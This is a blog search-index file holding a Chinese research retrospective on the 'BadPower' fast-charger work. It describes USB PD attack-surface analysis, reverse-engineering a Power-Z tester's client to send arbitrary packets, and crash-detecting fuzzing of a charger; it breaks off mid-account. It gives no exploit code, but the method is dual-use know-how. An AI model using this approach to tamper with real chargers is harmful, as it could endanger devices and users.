<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>写在”BadPower“之后</title>
      <link href="/2020/09/24/badpower/"/>
      <url>/2020/09/24/badpower/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x6BD5;&#x4E1A;&#x540E;&#x53C2;&#x52A0;&#x5DE5;&#x4F5C;&#xFF0C;&#x505A;&#x7684;&#x7B2C;&#x4E00;&#x4EF6;&#x4E8B;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#xFF0C;&#x76EE;&#x524D;&#x7B97;&#x662F;&#x544A;&#x4E00;&#x6BB5;&#x843D;&#x3002;&#x56DE;&#x60F3;&#x8D77;&#x6765;&#x611F;&#x89C9;&#x8FD8;&#x662F;&#x633A;&#x6709;&#x7EAA;&#x5FF5;&#x610F;&#x4E49;&#x7684;&#x3002;&#x5B66;&#x6821;&#x671F;&#x95F4;&#x56E0;&#x4E3A;&#x505A;&#x7684;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#xFF0C;&#x7EAF;&#x8F6F;&#x4EF6;&#x65B9;&#x9762;&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x5F00;&#x59CB;&#x641E;&#x786C;&#x4EF6;&#x8D70;&#x4E86;&#x5F88;&#x591A;&#x5F2F;&#x8DEF;&#xFF0C;&#x9646;&#x9646;&#x7EED;&#x7EED;&#x641E;&#x4E86;&#x8FD1;&#x4E00;&#x5E74;&#xFF0C;&#x867D;&#x7136;&#x662F;&#x4E8B;&#x540E;&#xFF0C;&#x5176;&#x5B9E;&#x60F3;&#x4E86;&#x60F3;&#x5F53;&#x65F6;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x611F;&#x89C9;&#x8981;&#x662F;&#x518D;&#x505A;&#x7C7B;&#x4F3C;&#x4E8E;&#x7684;&#x4F30;&#x8BA1;&#x80FD;&#x7701;&#x5F88;&#x591A;&#x65F6;&#x95F4;&#xFF0C;&#x5F53;&#x65F6;&#x7684;&#x7ECF;&#x5386;&#x8FD8;&#x662F;&#x633A;&#x6709;&#x610F;&#x601D;&#x7684;&#x3002;&#x52A0;&#x4E0A;&#x6700;&#x8FD1;&#x770B;&#x8131;&#x53E3;&#x79C0;&#x6709;&#x70B9;&#x4E0A;&#x5934;,&#x8001;&#x662F;&#x60F3;&#x5199;&#x70B9;&#x4E1C;&#x897F;. &#x6B63;&#x597D;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#xFF0C;&#x8981;&#x662F;&#x6709;&#x5E78;&#x6709;&#x4EBA;&#x770B;&#x5230;&#xFF0C;&#x5E76;&#x4E14;&#x89C9;&#x5F97;&#x6709;&#x4E9B;&#x7528;&#x7684;&#x8BDD;&#x90A3;&#x662F;&#x6781;&#x597D;&#x7684;&#x3002;</p><p><strong>&#x8BDD;&#x8BF4;</strong>&#x5F53;&#x5E74;&#x521A;&#x6BD5;&#x4E1A;&#xFF0C;&#x52A0;&#x5165;&#x7384;&#x6B66;&#x3002;&#x505A;&#x70B9;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;&#xFF1F;</p><p>xxx: &#x8FD9;&#x6709;&#x4E2A;&#x5FEB;&#x5145;&#x5B89;&#x5168;&#x7814;&#x7A76;&#x53EF;&#x4EE5;&#x505A;</p><p>&#x6211;&#xFF1A;&#x5FEB;&#x5145;&#x5B89;&#x5168;&#xFF1F;&#xFF08;&#x8BF4;&#x5B9E;&#x8BDD;&#xFF0C;&#x5E73;&#x65F6;&#x80CC;&#x7740;ThinkPad&#x90A3;&#x5768;&#x5927;&#x7535;&#x6E90;&#xFF0C;&#x7528;&#x7740;5V/1A&#x7684;&#x624B;&#x673A;&#x5145;&#x7535;&#x5668;&#xFF0C;&#x8FD8;&#x771F;&#x4E0D;&#x77E5;&#x9053;&#x5FEB;&#x5145;&#x662F;&#x5565;&#x2026;..&#xFF09;</p><p>xxx: &#x5C31;&#x662F;xxxxx</p><p>&#x6211;&#xFF1A;&#x54E6;&#x54E6; &#x5C31;&#x662F;&#x641E;&#x5145;&#x7535;&#x5668;&#x554A;&#xFF08;&#x5176;&#x5B9E;&#x5F53;&#x65F6;&#x5185;&#x5FC3;&#x8D3C;&#x8FF7;&#x60D1;&#xFF0C;&#x5145;&#x7535;&#x5668;&#x4E5F;&#x80FD;&#x641E;&#xFF0C;&#x771F;&#x7684;&#x7279;&#x4F69;&#x670D;tk&#x7684;&#x8111;&#x6D1E;&#xFF0C;&#x7B2C;&#x4E00;&#x610F;&#x8BC6;&#x5C31;&#x662F;&#x96BE;&#x9053;&#x662F;&#x7528;&#x9524;&#x5B50;&#x3002;&#x3002;&#x3002;&#x672C;&#x7740;&#x521D;&#x51FA;&#x725B;&#x728A;&#x4E0D;&#x6015;&#x864E;&#xFF0C;&#x9876;&#x7740;&#x597D;&#x5947;&#x5FC3;<del>~</del>&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x662F;&#x2026;&#xFF09;&#x53EF;&#x4EE5;&#x53EF;&#x4EE5;&#xFF0C;&#x6709;&#x610F;&#x601D;</p><p>&#x7136;&#x540E;&#x6211;&#x5C31;&#x8BA4;&#x9886;&#x4E86; <a href="http://www.chongdiantou.com" target="_blank" rel="noopener">www.chongdiantou.com</a> &#x5174;&#x51B2;&#x51B2;&#x7684;&#x56DE;&#x5230;&#x5DE5;&#x4F4D;&#x3002;&#x201D;&#x4E0A;&#x5145;&#x7535;&#x5934;&#x7F51;&#xFF0C;&#x638C;&#x63E1;&#x4E00;&#x624B;&#x5145;&#x7535;&#x8BBE;&#x5907;&#x8BC4;&#x6D4B;&#x62C6;&#x89E3;&#x4FE1;&#x606F;&#xFF0C;&#x65E0;&#x8BBA;&#x60A8;&#x662F;&#x60F3;&#x4E70;&#x5145;&#x7535;&#x5668;&#x8FD8;&#x662F;&#x60F3;&#x505A;&#x5145;&#x7535;&#x5668;&#xFF0C;&#x5145;&#x7535;&#x5934;&#x7F51;&#x90FD;&#x662F;&#x60A8;&#x7684;&#x4E0D;&#x4E8C;&#x9009;&#x62E9;&#x3002;&#x5145;&#x7535;&#x5934;&#x7F51;&#xFF0C;&#x5B9E;&#x5728;&#x5C45;&#x5BB6;&#x65C5;&#x884C;&#xFF0C;&#x76F4;&#x64AD;&#x5E26;&#x8D27;&#xFF0C;&#x5FC5;&#x5907;&#x826F;&#x7AD9;&#x201C;&#xFF08;&#x6700;&#x8FD1;&#x771F;&#x7684;&#x662F;&#x88AB;&#x8131;&#x53E3;&#x79C0;&#x5927;&#x4F1A;&#x7684;&#x84DD;&#x6CB3;&#x7EF5;&#x7F8A;&#x5976;&#x7ED9;&#x6D17;&#x8111;&#x4E86;&#x2026;&#x2026; &#x4E00;&#x5EA6;&#x6709;&#x60F3;&#x8F6C;&#x884C;&#x5199;&#x6BB5;&#x5B50;&#x7684;&#x5FF5;&#x60F3;&#x2026;&#x2026;&#xFF09;&#x3002;&#x56DE;&#x5F52;&#x6B63;&#x4F20;&#xFF0C;&#x8FD9;&#x4E0D;&#x662F;&#x6253;&#x5E7F;&#x544A;&#xFF0C;&#x7684;&#x786E;&#x662F;&#x5145;&#x7535;&#x5934;&#x7F51;&#x5728;&#x6574;&#x4E2A;&#x7814;&#x7A76;&#x8FC7;&#x7A0B;&#x4E2D;&#x5E2E;&#x52A9;&#x5F88;&#x5927;&#x3002;</p><h2 id="&#x5212;&#x6C34;&#x9636;&#x6BB5;"><a href="#&#x5212;&#x6C34;&#x9636;&#x6BB5;" class="headerlink" title="&#x5212;&#x6C34;&#x9636;&#x6BB5;"></a>&#x5212;&#x6C34;&#x9636;&#x6BB5;</h2><p>&#x5176;&#x5B9E;&#x6BD4;&#x8F83;&#x4E13;&#x4E1A;&#x7684;&#x672F;&#x8BED;&#x5E94;&#x8BE5;&#x53EB;&#x505A;&#x201D;&#x7814;&#x7A76;&#x76EE;&#x6807;&#x4E0E;&#x653B;&#x51FB;&#x9762;&#x5206;&#x6790;&#x201C;&#x3002;&#x4E70;&#x4E86;&#x4E2A;&#x67D0;&#x679C;&#x7684;&#x5145;&#x7535;&#x5668;&#x5F00;&#x59CB;&#x201D;&#x7814;&#x7A76;&#x201C;&#xFF0C;&#x5F53;&#x7136;&#x9664;&#x4E86;&#x611F;&#x89C9;&#x771F;&#x8D35;&#xFF0C;&#x624B;&#x611F;&#x4E0D;&#x9519;&#xFF0C;&#x8D28;&#x91CF;&#x5F88;&#x597D;&#xFF0C;&#x5F88;&#x91CD;&#x5F88;&#x7ED3;&#x5B9E;&#x5916;&#xFF0C;&#x8FD8;&#x662F;&#x53D1;&#x73B0;&#x4E86;&#x6709;&#x90A3;&#x4E48;&#x4E00;&#x4E2A;&#x5145;&#x7535;&#x53E3;&#x7684;&#x3002;&#x6240;&#x4EE5;&#x8BF4;&#x5728;&#x4E0D;&#x9524;&#x6389;&#x5B83;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x552F;&#x4E00;&#x7684;&#x653B;&#x51FB;&#x5165;&#x53E3;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x5C0F;&#x5C0F;&#x7684;typec&#x53E3;&#xFF0C;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x4E86;&#x5F88;&#x5E38;&#x89C4;&#x7684;&#x8C03;&#x7814;&#x6D41;&#x7A0B;&#x4E86;&#x3002;</p><p>&#x55EF;&#xFF0C;&#x5145;&#x7535;&#x5668;&#x91CC;&#x9762;&#x6709;&#x4E2A;&#x82AF;&#x7247;&#xFF0C;&#x91CC;&#x9762;&#x6709;&#x56FA;&#x4EF6;&#x3002;</p><p>&#x55EF;&#xFF0C;&#x5FEB;&#x5145;&#x662F;&#x534F;&#x8BAE;&#x7684;&#xFF0C;&#x5FEB;&#x5145;&#x534F;&#x8BAE;&#x6709;QC,VOOC&#x2026;&#x2026; &#x7136;&#x540E;&#x5C31;&#x662F;&#x4E3B;&#x6D41;&#x7684;USB PD</p><p>&#x55EF;&#xFF0C;&#x53EA;&#x6709;USB PD&#x662F;&#x5305;&#x542B;&#x6570;&#x636E;&#x534F;&#x8BAE;&#x7684;&#xFF0C;&#x6709;&#x6570;&#x636E;&#x5305;&#x7684;&#xFF0C;&#x534F;&#x8BAE;&#x6807;&#x51C6;&#x662F;&#x5F00;&#x6E90;&#x7684;&#xFF0C;&#x901A;&#x8FC7;typec&#x63A5;&#x53E3;&#x4F20;&#x8F93;</p><p>&#x65B9;&#x5411;&#x786E;&#x5B9A;&#x4E86;&#xFF0C;usb pd&#x534F;&#x8BAE;&#x662F;&#x5165;&#x53E3;&#x3002;&#x5F00;&#x59CB;&#x5543;USB PD&#x534F;&#x8BAE;&#x6587;&#x6863;&#xFF0C;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x5148;&#x5F04;&#x6E05;&#x695A;&#x90FD;&#x662F;&#x548B;&#x56DE;&#x4E8B;&#x3002;&#x5F53;&#x770B;&#x4E86;&#x534F;&#x8BAE;&#x6587;&#x6863;&#x4E4B;&#x540E;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x5F88;&#x597D;&#x5947;&#x4EBA;&#x5BB6;&#x5145;&#x7535;&#x5668;&#x5230;&#x5E95;&#x6709;&#x6CA1;&#x6709;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#xFF0C;&#x6216;&#x8005;&#x662F;&#x4E0D;&#x662F;&#x6309;&#x7167;&#x8FD9;&#x4E2A;&#x6807;&#x51C6;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x5176;&#x5B9E;&#x90FD;&#x4E0D;&#x597D;&#x8BF4;&#xFF0C;&#x5C31;&#x4E00;&#x80A1;&#x8111;&#x60F3;&#x770B;&#x770B;&#x80FD;&#x4E0D;&#x80FD;&#x6293;&#x5230;&#x5305;&#x770B;&#x770B;&#x5230;&#x5E95;&#x662F;&#x4EC0;&#x4E48;&#x4E2A;&#x60C5;&#x51B5;&#x3002;</p><p>&#x7136;&#x540E;&#x5C31;&#x5728;&#x5145;&#x7535;&#x5934;&#x7F51;&#x4E0A;&#x6252;&#x62C9;&#xFF0C;&#x53D1;&#x73B0;&#x4ED6;&#x4EEC;&#x5F00;&#x4E86;&#x4E2A;&#x6DD8;&#x5B9D;&#x5E97;&#xFF0C;&#x5728;&#x5356;&#x4E00;&#x4E2A;&#x6D4B;&#x8BD5;&#x8BBE;&#x5907;Power-Z&#xFF0C;&#x5176;&#x4E2D;&#x6709;&#x4E00;&#x6B3E;Power-Z KM001 Pro&#x8FD8;&#x5E26;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x8F6F;&#x4EF6;&#xFF0C;&#x80FD;&#x591F;&#x770B;&#x5230;&#x4E00;&#x4E9B;&#x4FE1;&#x606F;&#x3002;&#x5F53;&#x65F6;&#x8FD8;&#x6709;&#x4E2A;&#x5C0F;&#x63D2;&#x66F2;&#xFF0C;&#x4E70;&#x4E86;&#x4E4B;&#x540E;&#xFF0C;&#x7ED9;&#x53D1;&#x9519;&#x8D27;&#x4E86;&#xFF0C;&#x53D1;&#x4E86;&#x4E00;&#x4E2A;&#x66F4;&#x8D35;&#x7684;&#x8FC7;&#x6765;&#x4E86;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x548B;&#x7528;&#xFF0C;&#x5176;&#x5B9E;&#x5F53;&#x65F6;&#x4E5F;&#x6CA1;&#x60F3;&#x8FD9;&#x4E48;&#x591A;&#xFF0C;&#x6BD5;&#x7ADF;&#x4E00;&#x4E2A;&#x4FBF;&#x5B9C;&#x7684;&#x90FD;&#x652F;&#x6301;&#xFF0C;&#x8D35;&#x7684;&#x5C31;&#x4E0D;&#x7528;&#x8BF4;&#x4E86;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x4ED6;&#x4EEC;&#x7684;&#x6D4B;&#x8BD5;&#x7FA4;&#x91CC;&#x95EE;&#xFF0C;&#x7ED3;&#x679C;&#x4E0D;&#x652F;&#x6301;&#x5BA2;&#x6237;&#x7AEF;&#x8F6F;&#x4EF6;&#x3002;&#x3002;&#x3002;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x8F6F;&#x4EF6;&#x662F;&#x8FD9;&#x6837;&#x7684;&#x3002;&#x6709;&#x4E13;&#x95E8;&#x7684;USB PD&#x534F;&#x8BAE;&#x5305;&#x663E;&#x793A;&#xFF0C;&#x4F46;&#x6709;&#x9650;&#xFF0C;&#x53EA;&#x662F;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x57FA;&#x672C;&#x7684;&#xFF0C;&#x4E5F;&#x652F;&#x6301;&#x53D1;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x7279;&#x5B9A;&#x7684;&#x5305;&#x51FA;&#x53BB;&#x3002;&#x521D;&#x671F;&#x57FA;&#x672C;&#x591F;&#x7528;&#x4E86;&#xFF0C;&#x597D;&#x6B79;&#x662F;&#x770B;&#x5230;&#x4E86;&#x5B9E;&#x9645;&#x7684;&#x5305;&#x957F;&#x5565;&#x6837;&#x4E86;&#xFF0C;&#x4E00;&#x4E9B;&#x4E5F;&#x548C;&#x534F;&#x8BAE;&#x5BF9;&#x4E0A;&#x6765;&#x4E86;&#x3002;</p><img src="/images/badpower.assets/image-20200924103453343.png" alt="image-20200924103453343" style="zoom: 33%;"><h2 id="Fuzz&#x4E00;&#x4E0B;&#xFF1F;"><a href="#Fuzz&#x4E00;&#x4E0B;&#xFF1F;" class="headerlink" title="Fuzz&#x4E00;&#x4E0B;&#xFF1F;"></a>Fuzz&#x4E00;&#x4E0B;&#xFF1F;</h2><p>&#x5F00;&#x542F;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x6A21;&#x5F0F;&#xFF0C;&#x4ED6;&#x8FD9;&#x4E2A;power-z&#x662F;&#x6709;&#x4E2A;sniffer&#x6A21;&#x5F0F;&#x548C;&#x4E00;&#x4E2A;monitor&#x6A21;&#x5F0F;&#x3002;&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x662F;&#x60F3;&#x770B;&#x770B;&#x67D0;&#x679C;&#x7684;&#x5145;&#x7535;&#x5668;&#x548C;&#x7B14;&#x8BB0;&#x672C;&#x4E4B;&#x95F4;&#x90FD;&#x6709;&#x5565;&#x6D88;&#x606F;&#xFF0C;&#x6240;&#x4EE5;&#x91C7;&#x7528;monitor&#x6A21;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x76F8;&#x5F53;&#x5C34;&#x5C2C;&#xFF0C;&#x56E0;&#x4E3A;USB PD&#x6570;&#x636E;&#x4F20;&#x8F93;&#x901F;&#x5EA6;&#x5F88;&#x5FEB;&#xFF0C;&#x6211;&#x731C;&#x8FD9;&#x4E2A;&#x8BBE;&#x5907;&#x8BBE;&#x8BA1;&#x4E0A;&#x662F;&#x5148;&#x628A;&#x6570;&#x636E;&#x5B58;&#x5728;&#x786C;&#x4EF6;&#x8BBE;&#x5907;&#x7684;RAM&#x91CC;&#x9762;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x901A;&#x8FC7;USB&#x7AEF;&#x53E3;&#x53D1;&#x7ED9;&#x7535;&#x8111;&#x8F6F;&#x4EF6;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x592A;&#x5FEB;&#xFF0C;&#x53D1;&#x73B0;&#x8FDE;&#x7EED;&#x7684;&#x51E0;&#x6B21;&#x901A;&#x4FE1;&#x4E4B;&#x540E;&#x76F4;&#x63A5;&#x5D29;&#x4E86;&#x3002;&#x76F8;&#x5F53;&#x5C34;&#x5C2C;&#x3002;</p><p>&#x7136;&#x540E;&#x60F3;&#x7740;&#x8FD8;&#x662F;&#x76F2;&#x6D4B;&#x4E00;&#x4E0B;&#x5427;&#x3002;&#x6BD5;&#x7ADF;USB PD&#x534F;&#x8BAE;&#x5E76;&#x4E0D;&#x662F;&#x5F88;&#x590D;&#x6742;&#x3002;&#x5C31;&#x56DE;&#x5230;&#x4E86;&#x4E0A;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x8F6F;&#x4EF6;&#x6240;&#x652F;&#x6301;&#x53D1;&#x9001;&#x7684;&#x5305;&#x5C31;&#x7279;&#x5B9A;&#x7684;&#x90A3;&#x4E48;&#x51E0;&#x4E2A;&#xFF0C;&#x5176;&#x5B9E;&#x4E00;&#x5F00;&#x59CB;&#x662F;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x53BB;&#x627E;&#x5F00;&#x53D1;&#x8005;&#xFF0C;&#x95EE;&#x95EE;&#x80FD;&#x4E0D;&#x80FD;&#x7ED9;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x8FD9;&#x4E48;&#x7C7B;&#x4F3C;&#x81EA;&#x5B9A;&#x4E49;&#x4EFB;&#x610F;&#x5305;&#x7684;&#x529F;&#x80FD;&#x3002;&#x7136;&#x540E;&#x5F00;&#x53D1;&#x8005;&#x8BF4;&#x201C;&#x4F60;&#x8FD9;&#x4E2A;&#x60F3;&#x6CD5;&#x5F88;&#x597D;&#xFF0C;&#x6211;&#x8003;&#x8651;&#x540E;&#x7EED;&#x6DFB;&#x52A0;&#x201D;&#x3002; &#x8FD9;&#x4E00;&#x542C;&#x5C31;&#x77E5;&#x9053;&#x662F;&#x6CA1;&#x620F;&#x4E86;&#xFF0C;&#x53CD;&#x6B63;&#x6211;&#x4E5F;&#x6CA1;&#x62C9;&#x4E0B;&#x8138;&#x8981;&#x4E00;&#x4E0B;&#x6E90;&#x7801;&#xFF0C;&#x867D;&#x7136;&#x77E5;&#x9053;&#x7ED3;&#x679C;&#x4E5F;&#x5F88;&#x660E;&#x663E;&#x3002;&#x3002;&#x3002;</p><p>&#x53EA;&#x80FD;&#x81EA;&#x7ED9;&#x81EA;&#x8DB3;&#x4E86;&#xFF0C;&#x4F7F;&#x7528;ida+windbg&#x201C;&#x5B66;&#x4E60;&#x201D;&#x4E86;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x8F6F;&#x4EF6;&#xFF0C;&#x8F6F;&#x4EF6;&#x4E0A;&#x4F4D;&#x673A;&#x548C;&#x4E0B;&#x4F4D;&#x673A;power-z&#x7684;&#x901A;&#x4FE1;&#x4E5F;&#x5C31;&#x5F88;&#x6E05;&#x6670;&#x4E86;&#x3002;&#x90A3;&#x4E48;&#x6211;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x4EFB;&#x610F;&#x5305;&#x4E86;&#xFF0C;&#x53EA;&#x8981;&#x6D4B;&#x8BD5;&#x63A7;&#x5236;&#x4E00;&#x4E0B;&#x901F;&#x5EA6;&#xFF0C;power-z&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x7528;&#x7684;&#x3002;&#x53D1;&#x5305;-&#x56DE;&#x590D;&#x3002; &#x53EA;&#x5269;&#x4E0B;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x77E5;&#x9053;&#x6709;&#x6CA1;&#x6709;&#x5D29;&#xFF1F;</p><p>&#x6211;&#x53D1;&#x73B0;USB PD&#x53D7;&#x7535;&#x7AEF;&#x662F;&#x53EF;&#x4EE5;&#x53D1;&#x9001;get source cap&#x6765;&#x83B7;&#x53D6;&#x5145;&#x7535;&#x5668;&#x7684;&#x4F9B;&#x7535;&#x80FD;&#x529B;&#x7684;&#xFF0C;&#x5F53;&#x7136;&#x5D29;&#x4E86;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x53D1;&#x9001;&#x5C31;&#x80AF;&#x5B9A;&#x662F;&#x6CA1;&#x6709;&#x56DE;&#x5E94;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6BCF;&#x6B21;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x6D4B;&#x8BD5;&#x5305;&#x540E;&#xFF0C;&#x518D;&#x53D1;&#x4E00;&#x4E2A;get source cap&#x6765;&#x5224;&#x65AD;&#x662F;&#x4E0D;&#x662F;&#x5D29;&#x4E86;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x6240;&#x6709;&#x7684;&#x5305;&#x90FD;&#x8BB0;&#x5F55;&#x4E0B;&#x6765;&#x3002;&#x56E0;&#x4E3A;&#x534F;&#x8BAE;&#x89C4;&#x5B9A;&#x6709;&#x90E8;&#x5206;&#x662F;&#x53EF;&#x4EE5;&#x5382;&#x5546;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#xFF0C;&#x6240;&#x4EE5;fuzz&#x7A7A;&#x95F4;&#x662F;&#x5F88;&#x5927;&#x7684;&#xFF0C;&#x6211;&#x81EA;&#x5DF1;&#x8BBE;&#x7F6E;&#x4E86;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x7279;&#x6B8A;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x5168;0&#xFF0C;&#x5168;F&#x7C7B;&#x4F3C;&#x8FD9;&#x79CD;&#xFF0C;&#x7136;&#x540E;&#x90E8;&#x5206;&#x968F;&#x673A;&#xFF0C;&#x53CD;&#x6B63;&#x662F;&#x5F88;&#x5E38;&#x89C4;&#x7684;&#x5957;&#x8DEF;&#x3002;&#x8BA9;&#x4ED6;&#x5728;&#x90A3;&#x8DD1;&#x7740;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x5C31;&#x9ED8;&#x9ED8;&#x5543;&#x6587;&#x6863;&#x3002;&#x4E0B;&#x9762;&#x4E5F;&#x4E0D;&#x8BB0;&#x5F97;&#x662F;&#x54EA;&#x4E2A;&#x9636;&#x6BB5;&#x7684;&#x622A;&#x56FE;&#x4E86;&#xFF0C;&#x5927;&#x6982;&#x6837;&#x5B50;&#x662F;&#x8FD9;&#x6837;&#x7684;&#x3002;</p><img src="/images/badpower.assets/clipboard.png" alt="clipboard" style="zoom: 33%;"><p>&#x7ED3;&#x679C;&#x561B;&#x2026;.. &#x65E0;&#x8BBA;&#x6211;&#x5982;&#x4F55;fuzz, &#x5B83;&#x81EA;&#x5CBF;&#x7136;&#x4E0D;&#x52A8;. &#x7136;&#x540E;&#x5206;&#x6790;&#x4E86;&#x4E0B;&#x56DE;&#x5E94;&#x5305;, &#x53D1;&#x73B0;&#x201D;&#x8FD9;&#x5145;&#x7535;&#x5668;&#x6709;&#x4E1C;&#x897F;&#x201D;. &#x5C31;&#x5206;&#x6790;&#x6363;&#x9F13;,&#x731C;&#x6D4B;,&#x6D4B;&#x8BD5;,&#x628A;&#x90E8;&#x5206;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x5305;&#x7684;&#x7ED3;&#x6784;&#x7406;&#x6E05;&#x695A;&#x4E86;,&#x731C;&#x6D4B;&#x54EA;&#x51E0;&#x4F4D;&#x5E72;&#x5565;&#x7528;&#x7684;, &#x7136;&#x540E;&#x662F;&#x600E;&#x4E48;&#x5904;&#x7406;,&#x600E;&#x4E48;&#x56DE;. &#x6700;&#x540E;&#x5F97;&#x51FA;&#x7ED3;&#x8BBA;&#x2026;&#x2026; &#x641E;&#x4E0D;&#x4E86;&#x554A;&#x2026;&#x2026; &#x8FC7;&#x6EE4;&#x5F97;&#x592A;&#x72E0;&#x4E86;, &#x8FDE;&#x4E2A;&#x4FE1;&#x606F;&#x6CC4;&#x9732;&#x90FD;&#x6CA1;&#x6CD5;&#x5F04;. (&#x540E;&#x8BDD;, &#x540E;&#x9762;&#x628A;&#x56FA;&#x4EF6;&#x5F04;&#x51FA;&#x6765;&#x4E86;,&#x90A3;&#x90E8;&#x5206;&#x7684;&#x786E;&#x548C;&#x6211;&#x731C;&#x6D4B;&#x7684;&#x4E00;&#x81F4;).</p><h2 id="&#x7136;&#x540E;&#x600E;&#x4E48;&#x5F04;"><a href="#&#x7136;&#x540E;&#x600E;&#x4E48;&#x5F04;" class="headerlink" title="&#x7136;&#x540E;&#x600E;&#x4E48;&#x5F04;?"></a>&#x7136;&#x540E;&#x600E;&#x4E48;&#x5F04;?</h2><p>&#x5176;&#x5B9E;&#x524D;&#x9762;fuzz&#x90FD;&#x662F;&#x5543;&#x8001;&#x672C;,&#x56E0;&#x4E3A;&#x4EE5;&#x524D;&#x505A;&#x8FC7;fuzz,&#x6BD4;&#x8F83;&#x719F;&#x6089;&#x4E00;&#x70B9;. &#x4F46;&#x5176;&#x5B9E;&#x7F3A;&#x9677;&#x4E5F;&#x5F88;&#x660E;&#x663E;, &#x9996;&#x5148;&#x662F;fuzz&#x7A7A;&#x95F4;&#x592A;&#x5927;,&#x57FA;&#x672C;&#x662F;&#x6CA1;&#x6CD5;&#x6240;&#x6709;&#x8BD5;&#x4E00;&#x8BD5;&#x7684;,&#x5C31;&#x7B97;&#x8DD1;&#x5F88;&#x957F;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;,&#x603B;&#x4E4B;&#x679A;&#x4E3E;&#x4E0D;&#x9760;&#x8C31;(&#x4E3B;&#x8981;&#x8FD8;&#x6709;&#x4E2A;&#x95EE;&#x9898;,power-z&#x8DD1;&#x4E45;&#x4E86;&#x6709;&#x65F6;&#x5019;&#x5C31;&#x6CA1;&#x6CD5;&#x7528;&#x4E86;&#x2026;&#x2026;) . &#x5176;&#x6B21;&#x5C31;&#x662F;&#x6211;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E2A;&#x5305;fuzz,&#x5145;&#x7535;&#x5668;&#x534F;&#x8BAE;&#x5185;&#x4E00;&#x822C;&#x90FD;&#x6709;&#x4E2A;&#x72B6;&#x6001;&#x673A;&#x7684;,&#x8981;&#x662F;&#x5305;&#x4E4B;&#x95F4;&#x5173;&#x8054;,&#x57FA;&#x672C;&#x4E0A;&#x5C31;gg&#x4E86;.</p><p>&#x7136;&#x540E;&#x56DE;&#x5230;&#x4EE5;&#x524D;&#x7684;&#x95EE;&#x9898;,power-z&#x7684;monitor&#x662F;&#x53EF;&#x4EE5;&#x76D1;&#x542C;&#x7684;,&#x53EA;&#x662F;&#x8DD1;&#x7740;&#x5D29;&#x4E86;,&#x6211;&#x5E76;&#x4E0D;&#x662F;&#x5F88;&#x6E05;&#x695A;&#x67D0;&#x679C;&#x81EA;&#x5DF1;&#x5230;&#x5E95;&#x5E72;&#x4E86;&#x4E9B;&#x5565;. &#x4F46;&#x76EE;&#x524D;&#x4E5F;&#x6CA1;&#x5565;&#x5176;&#x4ED6;&#x597D;&#x7528;&#x7684;&#x8BBE;&#x5907;&#x4E86;&#x2026;&#x2026; &#x6240;&#x4EE5;&#x76EE;&#x524D;&#x6700;&#x7701;&#x4E8B;&#x7684;&#x5C31;&#x662F;&#x5148;&#x770B;&#x770B;&#x5B83;&#x81EA;&#x5DF1;&#x548C;&#x81EA;&#x5DF1;&#x8BBE;&#x5907;&#x4EA4;&#x4E92;&#x5230;&#x5E95;&#x5E72;&#x4E86;&#x4E9B;&#x5565;&#x4E8B;&#x60C5;.</p><p>&#x5728;&#x5076;&#x7136;&#x7684;&#x673A;&#x4F1A;&#x77E5;&#x9053;&#x4E86;&#x903B;&#x8F91;&#x5206;&#x6790;&#x4EEA;,&#x5176;&#x5B9E;&#x641E;&#x786C;&#x4EF6;&#x7684;&#x662F;&#x5F88;&#x6E05;&#x695A;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;. &#x5F53;&#x65F6;&#x6211;&#x4E00;&#x542C;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;,&#x611F;&#x89C9;&#x5F88;&#x9AD8;&#x7EA7;&#x7684;&#x611F;&#x89C9;,&#x4E3B;&#x8981;&#x662F;&#x88AB;&#x5B83;&#x7684;&#x540D;&#x5B57;&#x7ED9;&#x552C;&#x4F4F;&#x4E86;. 